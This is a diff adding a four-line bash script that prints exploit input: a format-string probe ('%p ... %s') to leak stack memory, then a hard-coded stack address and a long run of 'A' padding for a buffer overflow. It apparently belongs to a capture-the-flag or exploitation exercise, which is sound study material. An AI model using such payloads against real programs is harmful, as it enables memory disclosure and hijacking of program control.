@@ -1,0 +1,4 @@
+#!/bin/bash
+
+echo '%p %p %p %p %p %s %p %s'
+echo -e '\x70\xe5\xff\xff\xff\x7f\x00\x00' AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
